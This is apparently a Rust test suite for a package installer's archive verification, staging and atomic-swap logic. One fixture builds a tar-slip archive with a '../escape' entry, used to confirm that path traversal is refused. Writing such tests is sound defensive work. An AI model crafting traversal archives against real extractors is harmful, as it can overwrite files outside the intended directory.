// Copyright 2026 Andrew Yates
// SPDX-License-Identifier: Apache-2.0

use super::acceptance_fixtures::*;
use super::*;
use crate::manifest::Artifact;
use crate::tree::file_sha256;
use std::path::PathBuf;

fn tmp(label: &str) -> crate::testdir::Dir {
    crate::testdir::dir(&format!("atpkg-install-{label}-"))
}

fn tar_entry(name: &str, content: &[u8]) -> Vec<u8> {
    let mut h = [0u8; 512];
    let nb = name.as_bytes();
    h[..nb.len()].copy_from_slice(nb);
    h[100..108].copy_from_slice(b"0000644\0");
    h[108..116].copy_from_slice(b"0000000\0");
    h[116..124].copy_from_slice(b"0000000\0");
    h[124..136].copy_from_slice(format!("{:011o}\0", content.len()).as_bytes());
    h[136..148].copy_from_slice(b"00000000000\0");
    h[148..156].copy_from_slice(b"        ");
    h[156] = b'0';
    h[257..263].copy_from_slice(b"ustar\0");
    h[263..265].copy_from_slice(b"00");
    let sum: u32 = h.iter().map(|&b| u32::from(b)).sum();
    h[148..156].copy_from_slice(format!("{sum:06o}\0 ").as_bytes());

    let mut out = h.to_vec();
    out.extend_from_slice(content);
    out.resize(out.len() + (512 - content.len() % 512) % 512, 0);
    out
}

fn seal(path: PathBuf, mut tar: Vec<u8>) -> PathBuf {
    tar.resize(tar.len() + 1024, 0);
    std::fs::write(&path, crate::extract::fixtures::zstd_bytes(&tar)).unwrap();
    path
}

fn make_archive(dir: &Path) -> PathBuf {
    seal(
        dir.join("ay-18.tar.zst"),
        tar_entry("bin/ay", b"#!/bin/true\nthe ay binary"),
    )
}

fn make_slip_archive(dir: &Path) -> PathBuf {
    let mut tar = tar_entry("bin/ay", b"a plausible first entry");
    tar.extend(tar_entry("../escape", b"pwned"));
    seal(dir.join("slip-18.tar.zst"), tar)
}

fn make_gnu_archive(dir: &Path) -> PathBuf {
    let mut elf = vec![0_u8; 1024];
    elf[..7].copy_from_slice(b"\x7fELF\x02\x01\x01");
    let write16 =
        |bytes: &mut [u8], at, value: u16| bytes[at..at + 2].copy_from_slice(&value.to_le_bytes());
    let write32 =
        |bytes: &mut [u8], at, value: u32| bytes[at..at + 4].copy_from_slice(&value.to_le_bytes());
    let write64 =
        |bytes: &mut [u8], at, value: u64| bytes[at..at + 8].copy_from_slice(&value.to_le_bytes());
    write16(&mut elf, 16, 3);
    write16(&mut elf, 18, 62);
    write32(&mut elf, 20, 1);
    write64(&mut elf, 32, 64);
    write16(&mut elf, 52, 64);
    write16(&mut elf, 54, 56);
    write16(&mut elf, 56, 2);
    write32(&mut elf, 64, 1);
    write64(&mut elf, 80, 0x40_0000);
    write64(&mut elf, 96, 1024);
    write64(&mut elf, 104, 1024);
    write32(&mut elf, 120, 2);
    write64(&mut elf, 128, 256);
    write64(&mut elf, 136, 0x40_0100);
    write64(&mut elf, 152, 80);
    for (index, (tag, value)) in [
        (5, 0x40_0200),
        (10, 22),
        (0x6fff_fffe, 0x40_0280),
        (0x6fff_ffff, 1),
        (0, 0),
    ]
    .into_iter()
    .enumerate()
    {
        write64(&mut elf, 256 + index * 16, tag);
        write64(&mut elf, 264 + index * 16, value);
    }
    elf[512..534].copy_from_slice(b"\0libc.so.6\0GLIBC_2.39\0");
    write16(&mut elf, 640, 1);
    write16(&mut elf, 642, 1);
    write32(&mut elf, 644, 1);
    write32(&mut elf, 648, 16);
    write16(&mut elf, 662, 2);
    write32(&mut elf, 664, 11);
    let mut tar = tar_entry("bin/ay", &elf);
    // tar_entry's mode participates in its checksum; this fixture is deliberately a
    // non-executable shared-object-shaped input, which still has runtime requirements.
    tar.extend(tar_entry("BUILD-ORIGIN", b"glibc=2.17\n"));
    seal(dir.join("gnu-18.tar.zst"), tar)
}

struct Bundle {
    dir: crate::testdir::Dir,
    archive: PathBuf,
    art: Artifact,
}

fn bundle(label: &str) -> Bundle {
    bundle_with(label, make_archive)
}

/// A Rust toolchain's archive: a sysroot (`lib/rustlib`) beside its binary.
#[cfg(target_os = "macos")]
fn make_toolchain_archive(dir: &Path) -> PathBuf {
    let mut tar = tar_entry("bin/ay", b"#!/bin/true\nthe ay binary");
    tar.extend(tar_entry(
        "lib/rustlib/aarch64-apple-darwin/lib/libstd.rlib",
        b"an rlib",
    ));
    seal(dir.join("ay-18.tar.zst"), tar)
}

fn bundle_with(label: &str, make: fn(&Path) -> PathBuf) -> Bundle {
    let dir = tmp(label);
    let archive = make(&dir);
    let sha = file_sha256(&archive).unwrap();
    let probe = dir.join("probe");
    let modes = crate::extract::extract_tar_zst_tree(
        &archive,
        &probe,
        1 << 20,
        1000,
        ExtractOptions::default(),
        FrameChecksum::IfPresent,
    )
    .unwrap()
    .declared_modes();
    let root = tree_root_declared(&probe, &modes).unwrap();
    std::fs::remove_dir_all(&probe).unwrap();
    assert_eq!(root.len(), 64, "the fixture must carry a real tree_root");
    Bundle {
        dir,
        archive,
        art: artifact(&sha, &root),
    }
}

impl Bundle {
    fn build(&self) -> PathBuf {
        self.dir.join("store/ay/18")
    }

    fn installed(&self) -> (PathBuf, PathBuf) {
        let build = self.build();
        verify_and_stage(&self.art, &self.archive, &build, &StageHooks::NONE).unwrap();
        assert!(
            crate::store::build_is_complete(&build),
            "the fixture is only interesting once the build is really installed"
        );
        let witness = build.join("this-tree-survived");
        std::fs::write(&witness, b"old").unwrap();
        (build, witness)
    }
}

#[test]
fn incompatible_gnu_stage_never_replaces_a_live_tree_or_writes_ready() {
    use aterm_toolchain::gnu_runtime::{Host, Version};
    let b = bundle_with("gnu-runtime", make_gnu_archive);
    let mut artifact = b.art.clone();
    artifact.target = "x86_64-unknown-linux-gnu".into();
    artifact.kind = "elf-binary".into();
    let build = b.build();
    std::fs::create_dir_all(&build).unwrap();
    std::fs::write(build.join("witness"), b"prior live data").unwrap();
    let host = Host {
        machine: 62,
        glibc: Version::parse("2.35").unwrap(),
    };
    let error = verify_stage(
        &artifact,
        &b.archive,
        &build,
        &StageHooks::NONE,
        Purpose::Install(Some(host)),
    )
    .unwrap_err();
    assert!(
        error.to_string().contains("requires GNU libc 2.39"),
        "{error}"
    );
    assert_eq!(
        std::fs::read(build.join("witness")).unwrap(),
        b"prior live data"
    );
    assert!(!crate::store::ready_marker_path(&build).unwrap().exists());
    assert!(!build.join("bin/ay").exists());
    let compatible = b.dir.join("store/ay/19");
    let host = Host {
        glibc: Version::parse("2.39").unwrap(),
        ..host
    };
    assert!(
        verify_stage(
            &artifact,
            &b.archive,
            &compatible,
            &StageHooks::NONE,
            Purpose::Install(Some(host))
        )
        .is_ok()
    );
    assert!(
        crate::store::ready_marker_path(&compatible)
            .unwrap()
            .is_file()
    );
    assert!(crate::store::build_is_complete_on(&compatible, Some(host)));
    let older = Host {
        glibc: Version::parse("2.35").unwrap(),
        ..host
    };
    assert!(
        !crate::store::build_is_complete_on(&compatible, Some(older)),
        "an old ready marker cannot override this host's runtime"
    );
    #[cfg(unix)]
    {
        let pipe =
            std::ffi::CString::new(compatible.join("pipe").as_os_str().as_encoded_bytes()).unwrap();
        // SAFETY: `pipe` is a valid NUL-terminated path in this test's scratch store.
        assert_eq!(unsafe { libc::mkfifo(pipe.as_ptr(), 0o600) }, 0);
        assert!(
            crate::store::build_is_complete_on(&compatible, Some(host)),
            "an entry the admission cannot read is no verdict: the ready marker answers"
        );
        assert!(
            !crate::store::build_is_complete_on(&compatible, Some(older)),
            "nor does it hide this host's refusal"
        );
    }
    assert!(
        crate::store::ready_marker_path(&compatible)
            .unwrap()
            .is_file(),
        "a probe preserves the existing tree and marker"
    );
}

/// A build that is a link, even to the very tree admitted there, or a file is no complete
/// install on a GNU host, whatever ready marker stands beside it: its root is a refusal, and
/// no admission read what is behind it. CONTROL: the tree at its own folder is complete.
/// NEGATIVE CONTROL: class a link or file root "cannot judge" (`gnu_runtime`'s walk) and the
/// marker answers for each.
#[cfg(unix)]
#[test]
fn a_build_that_is_a_link_or_a_file_is_incomplete_whatever_its_marker() {
    use aterm_toolchain::gnu_runtime::{Host, Version};
    let b = bundle_with("gnu-root", make_gnu_archive);
    let mut artifact = b.art.clone();
    artifact.target = "x86_64-unknown-linux-gnu".into();
    artifact.kind = "elf-binary".into();
    let build = b.build();
    let host = Host {
        machine: 62,
        glibc: Version::parse("2.39").unwrap(),
    };
    verify_stage(
        &artifact,
        &b.archive,
        &build,
        &StageHooks::NONE,
        Purpose::Install(Some(host)),
    )
    .unwrap();
    assert!(crate::store::build_is_complete_on(&build, Some(host)));
    let elsewhere = b.dir.join("elsewhere");
    std::fs::rename(&build, &elsewhere).unwrap();
    std::os::unix::fs::symlink(&elsewhere, &build).unwrap();
    assert!(crate::store::ready_marker_path(&build).unwrap().is_file());
    assert!(
        !crate::store::build_is_complete_on(&build, Some(host)),
        "a link where the build was"
    );
    std::fs::remove_file(&build).unwrap();
    std::fs::write(&build, b"no folder").unwrap();
    assert!(
        !crate::store::build_is_complete_on(&build, Some(host)),
        "a file where the build was"
    );
}

#[test]
fn foreign_publication_inspection_never_claims_a_runnable_install() {
    let b = bundle_with("gnu-publication", make_gnu_archive);
    let mut artifact = b.art.clone();
    artifact.target = "x86_64-unknown-linux-gnu".into();
    artifact.kind = "elf-binary".into();
    let build = b.build();
    assert!(verify_for_publication(&artifact, &b.archive, &build, &StageHooks::NONE).is_ok());
    assert!(build.join("bin/ay").is_file());
    assert!(!crate::store::ready_marker_path(&build).unwrap().exists());
    assert!(!crate::store::build_is_complete(&build));
    assert!(
        verify_for_publication(&artifact, &b.archive, &build, &StageHooks::NONE).is_err(),
        "publication inspection cannot replace existing data"
    );
    let mut wrong = artifact.clone();
    wrong.target = "aarch64-unknown-linux-gnu".into();
    let wrong_build = b.dir.join("store/ay/20");
    assert!(verify_for_publication(&wrong, &b.archive, &wrong_build, &StageHooks::NONE).is_err());
    assert!(
        !crate::store::ready_marker_path(&wrong_build)
            .unwrap()
            .exists()
    );
}

#[test]
fn publication_preserves_a_destination_and_ready_marker_created_during_inspection() {
    let b = bundle_with("gnu-publication-conflict", make_gnu_archive);
    let mut artifact = b.art.clone();
    artifact.target = "x86_64-unknown-linux-gnu".into();
    artifact.kind = "elf-binary".into();
    let build = b.build();
    let marker = crate::store::ready_marker_path(&build).unwrap();
    let competing = |_: &Path| {
        std::fs::create_dir(&build).unwrap();
        std::fs::write(build.join("witness"), b"other writer's tree").unwrap();
        std::fs::write(&marker, b"other writer's ready marker").unwrap();
        Ok(())
    };
    let hooks = StageHooks {
        pre_swap: Some(&competing),
        ..StageHooks::NONE
    };
    assert!(verify_for_publication(&artifact, &b.archive, &build, &hooks).is_err());
    assert_eq!(
        std::fs::read(build.join("witness")).unwrap(),
        b"other writer's tree"
    );
    assert_eq!(
        std::fs::read(&marker).unwrap(),
        b"other writer's ready marker"
    );
    assert!(!build.join("bin/ay").exists());
}

#[test]
fn publication_never_sweeps_or_recovers_install_scratch() {
    let b = bundle_with("gnu-publication-scratch", make_gnu_archive);
    let mut artifact = b.art.clone();
    artifact.target = "x86_64-unknown-linux-gnu".into();
    artifact.kind = "elf-binary".into();
    let build = b.build();
    std::fs::create_dir_all(build.parent().unwrap()).unwrap();
    let old = crate::store::superseded_dir(&build).unwrap();
    std::fs::create_dir(&old).unwrap();
    std::fs::write(old.join("witness"), b"parked install").unwrap();
    assert!(verify_for_publication(&artifact, &b.archive, &build, &StageHooks::NONE).is_ok());
    assert_eq!(
        std::fs::read(old.join("witness")).unwrap(),
        b"parked install"
    );
    assert!(!build.join("witness").exists());
    assert!(!crate::store::ready_marker_path(&build).unwrap().exists());

    let next = b.dir.join("store/ay/19");
    let occupied = crate::store::incoming_dir(&next).unwrap();
    std::fs::create_dir(&occupied).unwrap();
    std::fs::write(occupied.join("witness"), b"another stage").unwrap();
    assert!(verify_for_publication(&artifact, &b.archive, &next, &StageHooks::NONE).is_err());
    assert_eq!(
        std::fs::read(occupied.join("witness")).unwrap(),
        b"another stage"
    );
    assert!(!next.exists());
    assert!(!crate::store::ready_marker_path(&next).unwrap().exists());
}

type Want = fn(&StageError) -> bool;

#[test]
fn a_stage_refused_before_the_swap_leaves_the_installed_build_intact() {
    type Sidecars = Result<Vec<(&'static str, Vec<u8>)>, StageError>;
    let b = bundle("refused");
    let slip = make_slip_archive(&b.dir);
    let slip_art = artifact(&file_sha256(&slip).unwrap(), "");
    let bad_digest = artifact("deadbeef", "");
    let bad_root = artifact(&b.art.sha256, &"a".repeat(64));
    let mut unknown_lane = b.art.clone();
    unknown_lane.protocol = "https".into();
    unknown_lane.payload = "pkg".into();
    let gated = std::cell::Cell::new(false);
    let watch = |_: &Path| -> Result<(), StageError> {
        gated.set(true);
        Ok(())
    };
    let refuse =
        |_: &Path| -> Result<(), StageError> { Err(StageError::SignerRefused("bin/ay".into())) };
    let unrenderable = |_: &str| -> Sidecars { Err(StageError::Payload("x".into())) };
    let bogus_suffix = |_: &str| -> Sidecars { Ok(vec![(".bogus", b"x".to_vec())]) };
    let watched = StageHooks {
        pre_swap: Some(&watch),
        sidecars: None,
        aliases: &[],
        npm_package: None,
    };
    let gate = StageHooks {
        pre_swap: Some(&refuse),
        sidecars: None,
        aliases: &[],
        npm_package: None,
    };
    let render = StageHooks {
        pre_swap: None,
        sidecars: Some(&unrenderable),
        aliases: &[],
        npm_package: None,
    };
    let suffix = StageHooks {
        pre_swap: None,
        sidecars: Some(&bogus_suffix),
        aliases: &[],
        npm_package: None,
    };
    let cases: [(&str, &Artifact, &Path, &StageHooks<'_>, Want); 7] = [
        ("digest", &bad_digest, &b.archive, &watched, |e| {
            matches!(
                e,
                StageError::DigestMismatch {
                    alg: DigestAlg::Sha256,
                    ..
                }
            )
        }),
        ("slip", &slip_art, &slip, &watched, |e| {
            matches!(e, StageError::Extract(_))
        }),
        ("tree_root", &bad_root, &b.archive, &watched, |e| {
            matches!(e, StageError::TreeRootMismatch { .. })
        }),
        ("unknown lane", &unknown_lane, &b.archive, &watched, |e| {
            matches!(e, StageError::Payload(_))
        }),
        ("gate", &b.art, &b.archive, &gate, |e| {
            matches!(e, StageError::SignerRefused(_))
        }),
        ("sidecar render", &b.art, &b.archive, &render, |e| {
            matches!(e, StageError::Payload(_))
        }),
        ("sidecar suffix", &b.art, &b.archive, &suffix, |e| {
            matches!(e, StageError::Payload(_))
        }),
    ];
    let (build, witness) = b.installed();
    let fresh = b.dir.join("store/ay/19");
    for (label, art, archive, hooks, want) in cases {
        for target in [&fresh, &build] {
            let err = verify_and_stage(art, archive, target, hooks).unwrap_err();
            assert!(want(&err), "{label}: {err:?}");
            assert!(scratch_beside(target).is_empty(), "{label}: scratch left");
        }
        assert!(
            !fresh.exists(),
            "{label}: a refused fresh stage left a build"
        );
        assert_eq!(
            std::fs::read(&witness).unwrap(),
            b"old",
            "{label}: the installed tree was replaced"
        );
        assert!(
            crate::store::build_is_complete(&build),
            "{label}: the installed build lost its marker"
        );
    }
    assert!(!gated.get(), "the gate saw bytes that failed verification");
    assert!(
        !build.parent().unwrap().join("escape").exists(),
        "the slip escaped the stage"
    );
}

/// The ordering hazard of a reinstall: when the flush that orders the old marker's
/// removal ahead of the swap fails, nothing is swapped (a power cut could otherwise
/// leave the old marker over the incoming tree, read as complete however little of it
/// landed): the stage fails, the installed tree stays, its marker is put back, and no
/// scratch is left. A folder the volume cannot flush (no ordering to be had) stages.
/// With the flush's outcome dropped, as before, the swap went on (the stage answered Ok).
#[test]
fn a_failed_flush_of_the_markers_removal_swaps_nothing() {
    use aterm_durable::seam::{EIO, ENOTSUP, FailingDirs};
    let b = bundle("swap-flush-fails");
    let (build, witness) = b.installed();
    {
        let _eio = FailingDirs::with(EIO);
        let err = verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE)
            .expect_err("a swap the marker's removal is not ordered ahead of");
        assert!(matches!(err, StageError::Io(_)));
    }
    assert_eq!(std::fs::read(&witness).unwrap(), b"old", "nothing swapped");
    assert!(
        crate::store::build_is_complete(&build),
        "the installed build's marker is back"
    );
    assert!(scratch_beside(&build).is_empty(), "no scratch left");
    {
        let _refused = FailingDirs::with(ENOTSUP);
        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE)
            .expect("no ordering is to be had on a volume that refuses it");
    }
    assert!(!witness.exists(), "the reinstall swapped in a fresh tree");
    assert!(crate::store::build_is_complete(&build));
}

#[test]
fn the_extraction_cap_follows_the_signed_size() {
    let cap = |disk_installed| {
        let mut a = artifact("", "");
        a.cost.disk_installed = disk_installed;
        size_cap(&a)
    };
    assert_eq!(cap(0), 2 << 30);
    assert_eq!(cap(1), 1 << 20);
    assert_eq!(cap(1 << 20), 2 << 20);
    assert_eq!(cap(u64::MAX), u64::MAX);
}

#[test]
fn a_sha512_row_is_gated_by_its_sha512() {
    let b = bundle("sha512");
    let sha512 = crate::tree::file_sha512(&b.archive).unwrap();
    let by_512 = |sha256: &str, sha512: &str| Artifact {
        sha256: sha256.into(),
        sha512: sha512.into(),
        ..b.art.clone()
    };
    let build = b.build();
    let upper = Artifact {
        tree_root: b.art.tree_root.to_ascii_uppercase(),
        ..by_512("", &sha512.to_ascii_uppercase())
    };
    verify_and_stage(&upper, &b.archive, &build, &StageHooks::NONE).unwrap();
    assert!(crate::store::build_is_complete(&build));
    let other = b.dir.join("store/ay/19");
    let err = verify_and_stage(
        &by_512("", &b.art.sha256),
        &b.archive,
        &other,
        &StageHooks::NONE,
    )
    .unwrap_err();
    assert!(
        matches!(&err, StageError::DigestMismatch { alg: DigestAlg::Sha512, got, .. } if *got == sha512),
        "{err:?}"
    );
    for (sha256, sha512) in [(b.art.sha256.as_str(), sha512.as_str()), ("", "")] {
        let err = verify_and_stage(
            &by_512(sha256, sha512),
            &b.archive,
            &other,
            &StageHooks::NONE,
        )
        .unwrap_err();
        assert!(
            matches!(&err, StageError::DigestMismatch { expected, .. } if expected.is_empty()),
            "{err:?}"
        );
    }
    assert!(!other.exists(), "nothing staged past a refused digest");
}

#[test]
fn an_unsigned_tree_root_requires_the_frame_checksum() {
    let dir = tmp("frame-checksum");
    let mut tar = tar_entry("bin/ay", b"#!/bin/true\nthe ay binary");
    tar.resize(tar.len() + 1024, 0);
    let bare = dir.join("bare.tar.zst");
    let mut zst = Vec::new();
    aterm_zstd::frame::write_raw(&mut zst, &tar, aterm_zstd::frame::Checksum::Omitted).unwrap();
    std::fs::write(&bare, zst).unwrap();
    let checked = make_archive(&dir);
    let probe = dir.join("probe");
    let modes = crate::extract::extract_tar_zst_tree(
        &bare,
        &probe,
        1 << 20,
        1000,
        ExtractOptions::default(),
        FrameChecksum::IfPresent,
    )
    .unwrap()
    .declared_modes();
    let root = tree_root_declared(&probe, &modes).unwrap();
    std::fs::remove_dir_all(&probe).unwrap();

    for payload in ["", "tar-zst"] {
        let row = |archive: &Path, root: &str| {
            let mut a = vendor_artifact(archive, payload, root);
            if payload.is_empty() {
                a.protocol = "github-release".into();
            }
            a
        };
        let build = dir.join(format!("store/ay-{payload}/18"));
        let err = verify_and_stage(&row(&bare, ""), &bare, &build, &StageHooks::NONE).unwrap_err();
        assert!(
            matches!(err, StageError::Extract(_))
                && err.to_string().contains("no content checksum"),
            "{payload:?}: got {err:?}"
        );
        assert!(!build.exists(), "{payload:?}: nothing is staged");
        assert!(scratch_beside(&build).is_empty(), "{payload:?}: no scratch");

        verify_and_stage(&row(&bare, &root), &bare, &build, &StageHooks::NONE)
            .unwrap_or_else(|e| panic!("{payload:?}, root signed: {e}"));
        let unsigned = dir.join(format!("store/ay-{payload}/19"));
        verify_and_stage(&row(&checked, ""), &checked, &unsigned, &StageHooks::NONE)
            .unwrap_or_else(|e| panic!("{payload:?}, checksummed: {e}"));
        for b in [&build, &unsigned] {
            assert_eq!(
                std::fs::read(b.join("bin/ay")).unwrap(),
                b"#!/bin/true\nthe ay binary",
                "{payload:?}"
            );
        }
    }
}

#[test]
fn a_new_stage_sweeps_scratch_left_by_a_killed_run() {
    let b = bundle("sweep");
    let build = b.build();
    std::fs::create_dir_all(build.parent().unwrap()).unwrap();
    let orphan = build.with_file_name("18.incoming-999999");
    std::fs::create_dir_all(orphan.join("bin")).unwrap();
    std::fs::write(orphan.join("bin/half"), b"partial").unwrap();
    assert!(orphan.exists(), "the fixture starts with debris on disk");

    verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
    assert!(!orphan.exists(), "the orphaned scratch was not swept");
    assert!(crate::store::build_is_complete(&build));
    assert!(scratch_beside(&build).is_empty());
}

#[cfg(unix)]
#[test]
fn sdk_custody_refuses_same_build_swap_until_final_close() {
    let b = bundle("sdk-custody-swap");
    let (build, witness) = b.installed();
    let incoming = crate::store::incoming_dir(&build).unwrap();
    std::fs::create_dir_all(incoming.join("bin")).unwrap();
    std::fs::write(incoming.join("bin/new"), b"owned inert fixture").unwrap();
    let prefix = build.ancestors().nth(3).unwrap();
    let subject = crate::lease::Subject::of_dir(prefix, &build).unwrap();
    let lease =
        crate::lease::take(prefix, &subject, "SDK reader", std::time::Duration::ZERO).unwrap();
    let child = lease.try_clone_descriptor().unwrap();
    drop(lease);
    assert_eq!(
        swap_into_place(&build, &incoming).unwrap_err().kind(),
        std::io::ErrorKind::WouldBlock
    );
    assert!(witness.exists() && crate::store::build_is_complete(&build));
    assert!(incoming.join("bin/new").is_file());
    drop(child);
    let publication = aterm_uds::deadline::once_released(|| swap_into_place(&build, &incoming));
    assert!(!witness.exists() && build.join("bin/new").is_file());
    assert!(matches!(
        crate::lease::reclaim(prefix, &subject),
        crate::lease::Reclaim::Keep(_)
    ));
    drop(publication);
    assert!(matches!(
        crate::lease::reclaim(prefix, &subject),
        crate::lease::Reclaim::Clear(_)
    ));
}

#[test]
fn a_swap_that_cannot_begin_restores_the_marker_it_took_down() {
    let b = bundle("swap-blocked");
    let (build, witness) = b.installed();

    let blocker = crate::store::superseded_dir(&build).unwrap();
    std::fs::write(&blocker, b"not a directory").unwrap();
    let incoming = crate::store::incoming_dir(&build).unwrap();
    std::fs::create_dir_all(incoming.join("bin")).unwrap();
    #[cfg(windows)]
    let held = std::fs::File::open(&witness).unwrap();

    let err = swap_into_place(&build, &incoming).unwrap_err();
    #[cfg(windows)]
    drop(held);
    assert!(
        blocker.is_file(),
        "the fixture only exercises the failed-retire path while the blocker is there"
    );
    let refused = if cfg!(windows) {
        std::io::ErrorKind::PermissionDenied
    } else {
        std::io::ErrorKind::NotADirectory
    };
    assert_eq!(
        err.kind(),
        refused,
        "the fixture must fail at the FIRST rename, not somewhere else"
    );
    assert!(
        witness.exists(),
        "the old tree never moved and must still be here"
    );
    assert!(
        crate::store::build_is_complete(&build),
        "a swap that could not begin must leave the build as complete as it found it"
    );
}

#[test]
fn a_swap_preserves_every_held_incoming_or_superseded_target() {
    let b = bundle("swap-held-targets");
    let (build, witness) = b.installed();
    for target in [
        crate::store::incoming_dir(&build).unwrap(),
        crate::store::superseded_dir(&build).unwrap(),
    ] {
        let exe = target.join("bin/inert");
        std::fs::create_dir_all(exe.parent().unwrap()).unwrap();
        std::fs::write(&exe, b"inert owned text, never executed").unwrap();
        let hold = crate::store::hold_first_exec(&exe).unwrap();
        let incoming = crate::store::incoming_dir(&build).unwrap();
        std::fs::create_dir_all(&incoming).unwrap();
        assert!(swap_into_place(&build, &incoming).is_err());
        assert!(exe.is_file() && witness.is_file());
        assert!(
            crate::store::build_is_complete(&build),
            "refusal precedes marker removal"
        );
        hold.ran();
        crate::store::remove_tree(&target).unwrap();
    }
    let incoming = crate::store::incoming_dir(&build).unwrap();
    drop(swap_into_place(&build, &incoming).unwrap());
    assert!(
        build.is_dir() && !witness.exists(),
        "unheld swap never reacquires its own gate"
    );
}

#[test]
fn a_failed_final_rename_rolls_the_old_build_back_and_re_marks_it() {
    let b = bundle("rollback-complete");
    let (build, witness) = b.installed();

    let incoming = crate::store::incoming_dir(&build).unwrap();
    assert!(
        !incoming.exists(),
        "the fixture depends on the incoming tree being absent"
    );

    let err = swap_into_place(&build, &incoming).unwrap_err();
    assert_eq!(
        err.kind(),
        std::io::ErrorKind::NotFound,
        "the fixture must fail at the rename, not somewhere else"
    );
    assert!(
        witness.exists() && std::fs::read(&witness).unwrap() == b"old",
        "the old build must be back at its own path, not stranded in .superseded-"
    );
    assert!(
        crate::store::build_is_complete(&build),
        "it was complete before the swap, so it must be complete after the rollback"
    );
    assert!(
        scratch_beside(&build).is_empty(),
        "the rollback must not leave the superseded tree behind: {:?}",
        scratch_beside(&build)
    );
}

#[test]
fn a_rollback_never_promotes_a_tree_that_was_never_complete() {
    let b = bundle("rollback-incomplete");
    let (build, witness) = b.installed();
    crate::store::clear_build_ready(&build).unwrap();
    assert!(
        !crate::store::build_is_complete(&build),
        "the fixture is only interesting while the tree is marker-less"
    );

    let incoming = crate::store::incoming_dir(&build).unwrap();
    assert!(!incoming.exists());
    let err = swap_into_place(&build, &incoming).unwrap_err();
    assert_eq!(err.kind(), std::io::ErrorKind::NotFound);

    assert!(witness.exists(), "the tree still comes back");
    assert!(
        !crate::store::build_is_complete(&build),
        "a rollback must never mark a build that was not complete before it"
    );
    assert!(scratch_beside(&build).is_empty());
}

#[test]
fn the_marker_is_written_last_and_is_never_part_of_the_hashed_tree() {
    let b = bundle("marker-last");
    let build = b.build();
    verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();

    assert!(crate::store::build_is_complete(&build));
    let modes = crate::store::declared_modes(&build).unwrap();
    assert_eq!(
        tree_root_declared(&build, &modes).unwrap(),
        b.art.tree_root,
        "the marker must not have moved the tree_root — it is not inside the tree"
    );
    let marker = build.with_file_name("18.ready");
    assert!(marker.is_file(), "the marker is the SIBLING <build>.ready");
}

fn block_the_marker_write(build_dir: &Path) -> (PathBuf, crate::metadata_io::seam::Guard) {
    let marker = crate::store::ready_marker_path(build_dir).unwrap();
    let blocker = marker.clone();
    let guard = crate::metadata_io::seam::before_publish(move |destination| {
        if destination == marker {
            std::fs::create_dir_all(marker.join("occupied"))?;
        }
        Ok(())
    });
    (blocker, guard)
}

#[test]
fn a_marker_write_that_fails_after_the_swap_keeps_the_verified_tree() {
    let b = bundle("marker-fail-keeps-tree");
    let (build, witness) = b.installed();
    let (blocker, guard) = block_the_marker_write(&build);
    assert!(
        crate::store::build_is_complete(&build),
        "PRECONDITION: build 18 is installed and complete before the re-stage"
    );

    let err = verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap_err();
    assert!(
        matches!(err, StageError::Io(_)),
        "the marker write is what failed: {err:?}"
    );

    assert!(
        build.is_dir(),
        "a failed marker write destroyed a fully verified, correctly swapped-in tree"
    );
    assert!(
        !witness.exists(),
        "the swap installs the NEW tree, never merging into the old one"
    );
    assert_eq!(
        std::fs::read(build.join("bin/ay")).unwrap(),
        b"#!/bin/true\nthe ay binary",
        "and the tree left behind is the VERIFIED one, not a partial"
    );
    assert!(
        !crate::store::build_is_complete(&build),
        "a build that could not be marked must never read as complete"
    );

    std::fs::remove_dir_all(&blocker).unwrap();
    drop(guard);
    verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
    assert!(crate::store::build_is_complete(&build));
}

#[test]
fn a_crash_between_the_two_renames_recovers_the_old_tree_instead_of_deleting_it() {
    let b = bundle("crash-window-recover");
    let (build, witness) = b.installed();
    let superseded = crate::store::superseded_dir(&build).unwrap();
    crate::store::clear_build_ready(&build).unwrap();
    std::fs::rename(&build, &superseded).unwrap();
    assert!(
        !build.exists() && superseded.is_dir(),
        "PRECONDITION: mid-swap"
    );

    crate::store::sweep_stage_scratch(&build);

    assert!(
        build.is_dir(),
        "the only copy of the old tree was deleted as scratch — nothing is left"
    );
    assert!(
        build.join(witness.file_name().unwrap()).exists(),
        "and it is THAT tree, not a lookalike"
    );
    assert!(
        !crate::store::build_is_complete(&build),
        "recovery must never claim a completeness it cannot prove"
    );
    assert!(!superseded.exists(), "and the scratch name is released");
}

#[test]
fn a_refused_recovery_keeps_every_parked_tree_and_sweeps_the_rest() {
    let b = bundle("crash-window-refused");
    let (build, witness) = b.installed();
    let parked = crate::store::superseded_dir(&build).unwrap();
    crate::store::clear_build_ready(&build).unwrap();
    std::fs::rename(&build, &parked).unwrap();
    let sibling = |suffix: &str| build.with_file_name(format!("18.{suffix}"));
    let other = sibling("superseded-4242");
    std::fs::create_dir_all(&other).unwrap();
    let stray = sibling("superseded-9999");
    std::fs::write(&stray, b"not a tree").unwrap();
    let incoming = crate::store::incoming_dir(&build).unwrap();
    std::fs::create_dir_all(&incoming).unwrap();

    crate::store::sweep_stage_scratch(&build);

    assert!(
        parked.join(witness.file_name().unwrap()).exists() && other.is_dir(),
        "a sweep the refused recovery called off took a parked tree"
    );
    assert!(!stray.exists(), "a file at a scratch name leaks forever");
    assert!(
        !incoming.exists(),
        "an unverified half-extract is still swept"
    );
}

#[test]
fn the_sweep_beside_a_live_build_takes_only_the_producers_scratch() {
    let b = bundle("sweep-shape");
    let (build, _) = b.installed();
    let user_dir = build.with_file_name("18.incoming-drafts");
    std::fs::create_dir_all(&user_dir).unwrap();
    std::fs::write(user_dir.join("notes.md"), b"mine").unwrap();
    let incoming = crate::store::incoming_dir(&build).unwrap();
    let superseded = crate::store::superseded_dir(&build).unwrap();
    for scratch in [&incoming, &superseded] {
        std::fs::create_dir_all(scratch.join("bin")).unwrap();
    }

    crate::store::sweep_stage_scratch(&build);

    assert!(
        !incoming.exists() && !superseded.exists(),
        "scratch was left"
    );
    assert!(
        user_dir.join("notes.md").exists(),
        "a lookalike is not ours"
    );
    assert!(crate::store::build_is_complete(&build));
}

#[cfg(target_os = "macos")]
fn is_link(path: &Path) -> bool {
    std::fs::symlink_metadata(path).is_ok_and(|m| m.file_type().is_symlink())
}

#[cfg(target_os = "macos")]
fn is_real_dir(path: &Path) -> bool {
    std::fs::symlink_metadata(path).is_ok_and(|m| m.is_dir())
}

